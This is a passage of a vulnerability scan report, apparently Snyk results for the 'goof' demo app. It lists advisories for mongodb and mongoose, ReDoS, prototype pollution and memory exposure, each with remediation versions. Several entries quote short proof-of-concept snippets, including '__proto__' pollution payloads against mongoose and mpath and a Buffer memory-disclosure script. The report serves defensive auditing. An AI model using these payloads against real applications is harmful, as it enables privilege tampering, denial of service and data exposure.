\\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `mongodb` to version 3.1.13 or higher.\\n## References\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1203)\\n\",\n  \"disclosureTime\": \"2019-10-04T18:34:48Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"3.1.13\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MONGODB-473855\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-mh5c-679w-hh4r\"\n    ],\n    \"NSP\": [\n      \"1203\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:14.405707Z\",\n  \"moduleName\": \"mongodb\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mongodb\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-10-18T17:22:39Z\",\n  \"references\": [\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1203\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.1.13\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Denial of Service (DoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"mongodb@2.0.46\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@5.4.10\",\n    \"mongodb@3.1.13\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mongodb\",\n  \"version\": \"2.0.46\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mongodb@2.0.46 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MONGOOSE-1086688",
          "desc": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `mongoose.Schema()` function is subject to prototype pollution due to the recursively calling of `Schema.prototype.add()` function to add new items into the schema object. This vulnerability allows modification of the Object prototype.\r\n\r\n\r\n### PoC\r\n```\r\nmongoose = require('mongoose');\r\nmongoose.version; //'5.12.0'\r\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"HACKED\"}}';\r\nconsole.log('Before:', {}.polluted); // undefined\r\nmongoose.Schema(JSON.parse(malicious_payload));\r\nconsole.log('After:', {}.polluted); // HACKED\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mongoose` to version 5.12.2 or higher.\n## References\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/3ed44ffa13737be9fc0d709980da9c3c552d54e7)\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/10035)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-03-18T13:23:51.971980Z\",\n  \"credit\": [\n    \"zpbrent(zhou\",\n    \"peng@shu)\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The `mongoose.Schema()` function is subject to prototype pollution due to the recursively calling of `Schema.prototype.add()` function to add new items into the schema object. This vulnerability allows modification of the Object prototype.\\r\\n\\r\\n\\r\\n### PoC\\r\\n```\\r\\nmongoose = require('mongoose');\\r\\nmongoose.version; //'5.12.0'\\r\\nvar malicious_payload = '{\\\"__proto__\\\":{\\\"polluted\\\":\\\"HACKED\\\"}}';\\r\\nconsole.log('Before:', {}.polluted); // undefined\\r\\nmongoose.Schema(JSON.parse(malicious_payload));\\r\\nconsole.log('After:', {}.polluted); // HACKED\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `mongoose` to version 5.12.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/3ed44ffa13737be9fc0d709980da9c3c552d54e7)\\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/10035)\\n\",\n  \"disclosureTime\": \"2021-03-18T13:23:15Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"5.12.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MONGOOSE-1086688\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-03-24T15:13:10.965030Z\",\n  \"moduleName\": \"mongoose\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mongoose\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-03-24T15:13:10.931960Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/Automattic/mongoose/commit/3ed44ffa13737be9fc0d709980da9c3c552d54e7\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/Automattic/mongoose/issues/10035\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<5.12.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@5.12.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mongoose\",\n  \"version\": \"4.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-002418"
            ],
            "nist": [
              "SC-8"
            ],
            "cweid": [
              "200"
            ],
            "cveid": [
              "2019-17426"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Information Exposure",
          "id": "SNYK-JS-MONGOOSE-472486",
          "desc": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Information Exposure. Any query object with a `_bsontype` attribute is ignored, allowing attackers to bypass access control.\n## Remediation\nUpgrade `mongoose` to version 4.13.21, 5.7.5 or higher.\n## References\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c)\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/8222)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-10-10T10:28:19.716252Z\",\n  \"credit\": [\n    \"xiaofen9\"\n  ],\n  \"cvssScore\": 5.9,\n  \"description\": \"## Overview\\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\\n\\nAffected versions of this package are vulnerable to Information Exposure. Any query object with a `_bsontype` attribute is ignored, allowing attackers to bypass access control.\\n## Remediation\\nUpgrade `mongoose` to version 4.13.21, 5.7.5 or higher.\\n## References\\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c)\\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/8222)\\n\",\n  \"disclosureTime\": \"2019-07-10T01:52:12Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.13.21\",\n    \"5.7.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MONGOOSE-472486\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-17426\"\n    ],\n    \"CWE\": [\n      \"CWE-200\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:22.652192Z\",\n  \"moduleName\": \"mongoose\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mongoose\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-10-10T10:31:41Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/Automattic/mongoose/issues/8222\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.13.21\",\n      \">=5.0.0 <5.7.5\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Information Exposure\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@4.13.21\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mongoose\",\n  \"version\": \"4.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "201"
            ],
            "cveid": [],
            "ghsaid": [
              "r5xw-q988-826m"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Remote Memory Exposure",
          "id": "npm:mongoose:20160116",
          "desc": "## Overview\r\nA potential memory disclosure vulnerability exists in mongoose.\r\nA `Buffer` field in a MongoDB document can be used to expose sensitive\r\ninformation such as code, runtime memory and user data into MongoDB.\r\n\r\n### Details\r\nInitializing a `Buffer` field in a document with integer `N` creates a `Buffer`\r\nof length `N` with non zero-ed out memory.\r\n**Example:**\r\n```\r\nvar x = new Buffer(100); // uninitialized Buffer of length 100\r\n// vs\r\nvar x = new Buffer('100'); // initialized Buffer with value of '100'\r\n```\r\nInitializing a MongoDB document field in such manner will dump uninitialized\r\nmemory into MongoDB.\r\nThe patch wraps `Buffer` field initialization in mongoose by converting a\r\n`number` value `N` to array `[N]`, initializing the `Buffer` with `N` in its\r\nbinary form.\r\n\r\n#### Proof of concept\r\n```javascript\r\nvar mongoose = require('mongoose');\r\nmongoose.connect('mongodb://localhost/bufftest');\r\n\r\n// data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html\r\nmongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));\r\n\r\nvar Item = mongoose.model('Item');\r\n\r\nvar sample = new Item();\r\nsample.id = 'item1';\r\n\r\n// This will create an uninitialized buffer of size 100\r\nsample.data = 100;\r\nsample.save(function () {\r\n    Item.findOne(function (err, result) {\r\n        // Print out the data (exposed memory)\r\n        console.log(result.data.toString('ascii'))\r\n        mongoose.connection.db.dropDatabase(); // Clean up everything\r\n        process.exit();\r\n    });\r\n});\r\n```\r\n\r\n## Remediation\r\nUpgrade `mongoose` to version >= 3.8.39 or >= 4.3.6.\r\n\r\nIf a direct dependency update is not possible, use [`snyk wizard`](https://snyk.io/docs/using-snyk#wizard) to patch this vulnerability.\r\n\r\n## References\r\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/3764)\r\n- [Blog: Node Buffer API fix](https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials)\r\n- [Blog: Information about Buffer](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MONGOOSE-10081\"\n  ],\n  \"creationTime\": \"2016-01-23T12:00:05.158000Z\",\n  \"credit\": [\n    \"ChALkeR\"\n  ],\n  \"cvssScore\": 5.1,\n  \"description\": \"## Overview\\r\\nA potential memory disclosure vulnerability exists in mongoose.\\r\\nA `Buffer` field in a MongoDB document can be used to expose sensitive\\r\\ninformation such as code, runtime memory and user data into MongoDB.\\r\\n\\r\\n### Details\\r\\nInitializing a `Buffer` field in a document with integer `N` creates a `Buffer`\\r\\nof length `N` with non zero-ed out memory.\\r\\n**Example:**\\r\\n```\\r\\nvar x = new Buffer(100); // uninitialized Buffer of length 100\\r\\n// vs\\r\\nvar x = new Buffer('100'); // initialized Buffer with value of '100'\\r\\n```\\r\\nInitializing a MongoDB document field in such manner will dump uninitialized\\r\\nmemory into MongoDB.\\r\\nThe patch wraps `Buffer` field initialization in mongoose by converting a\\r\\n`number` value `N` to array `[N]`, initializing the `Buffer` with `N` in its\\r\\nbinary form.\\r\\n\\r\\n#### Proof of concept\\r\\n```javascript\\r\\nvar mongoose = require('mongoose');\\r\\nmongoose.connect('mongodb://localhost/bufftest');\\r\\n\\r\\n// data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html\\r\\nmongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));\\r\\n\\r\\nvar Item = mongoose.model('Item');\\r\\n\\r\\nvar sample = new Item();\\r\\nsample.id = 'item1';\\r\\n\\r\\n// This will create an uninitialized buffer of size 100\\r\\nsample.data = 100;\\r\\nsample.save(function () {\\r\\n    Item.findOne(function (err, result) {\\r\\n        // Print out the data (exposed memory)\\r\\n        console.log(result.data.toString('ascii'))\\r\\n        mongoose.connection.db.dropDatabase(); // Clean up everything\\r\\n        process.exit();\\r\\n    });\\r\\n});\\r\\n```\\r\\n\\r\\n## Remediation\\r\\nUpgrade `mongoose` to version >= 3.8.39 or >= 4.3.6.\\r\\n\\r\\nIf a direct dependency update is not possible, use [`snyk wizard`](https://snyk.io/docs/using-snyk#wizard) to patch this vulnerability.\\r\\n\\r\\n## References\\r\\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/3764)\\r\\n- [Blog: Node Buffer API fix](https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials)\\r\\n- [Blog: Information about Buffer](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)\",\n  \"disclosureTime\": \"2016-01-23T12:00:05Z\",\n  \"exploit\": \"Functional\",\n  \"fixedIn\": [\n    \"3.8.39\",\n    \"4.3.6\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:mongoose:20160116\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MONGOOSE-10081\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-201\"\n    ],\n    \"GHSA\": [\n      \"GHSA-r5xw-q988-826m\"\n    ],\n    \"NSP\": [\n      \"599\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:50.939463Z\",\n  \"moduleName\": \"mongoose\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mongoose\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mongoose:20160116:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.793467Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mongoose/20160116/20160116_0_0_mongoose_8066b145c07984c8b7e56dbb51721c0a3d48e18a.patch\"\n      ],\n      \"version\": \"<4.3.6 >=4.1.2\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mongoose:20160116:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.794587Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mongoose/20160116/20160116_0_1_mongoose_8066b145c07984c8b7e56dbb51721c0a3d48e18a.patch\"\n      ],\n      \"version\": \"<4.1.2 >=4.0.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mongoose:20160116:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.795690Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mongoose/20160116/20160116_0_3_mongoose_2ff7d36c5e52270211b17f3a84c8a47c6f4d8c1f.patch\"\n      ],\n      \"version\": \"<3.8.39 >=3.6.11\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mongoose:20160116:3\",\n      \"modificationTime\": \"2019-12-03T11:40:45.796737Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mongoose/20160116/20160116_0_5_mongoose_2ff7d36c5e52270211b17f3a84c8a47c6f4d8c1f.patch\"\n      ],\n      \"version\": \"=3.6.11\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:mongoose:20160116:4\",\n      \"modificationTime\": \"2019-12-03T11:40:45.797883Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/mongoose/20160116/20160116_0_4_mongoose_2ff7d36c5e52270211b17f3a84c8a47c6f4d8c1f.patch\"\n      ],\n      \"version\": \"<3.6.10 >=3.5.5\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2016-01-23T12:00:05Z\",\n  \"references\": [\n    {\n      \"title\": \"Blog: Information about Buffer\",\n      \"url\": \"https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md\"\n    },\n    {\n      \"title\": \"Blog: Node Buffer API fix\",\n      \"url\": \"https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md%23previous-materials\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/Automattic/mongoose/issues/3764\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=3.5.5 <3.8.39\",\n      \">=4.0.0 <4.3.6\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Remote Memory Exposure\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@4.3.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"mongoose\",\n  \"version\": \"4.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-23438"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MPATH-1577289",
          "desc": "## Overview\n[mpath](https://www.npmjs.com/package/mpath) is a package that gets/sets javascript object values using MongoDB-like path notation.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition `ignoreProperties.indexOf(parts[i]) !== -1` returns `-1` if `parts[i]` is `['__proto__']`. This is because the method that has been called if the input is an array is `Array.prototype.indexOf()` and not `String.prototype.indexOf()`. They behave differently depending on the type of the input.\r\n\r\n### PoC\r\n```\r\nconst mpath = require('mpath');\r\n// mpath.set(['__proto__', 'polluted'], 'yes', {});\r\n// console.log(polluted); // ReferenceError: polluted is not defined\r\n\r\nmpath.set([['__proto__'], 'polluted'], 'yes', {});\r\nconsole.log(polluted); // yes\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a 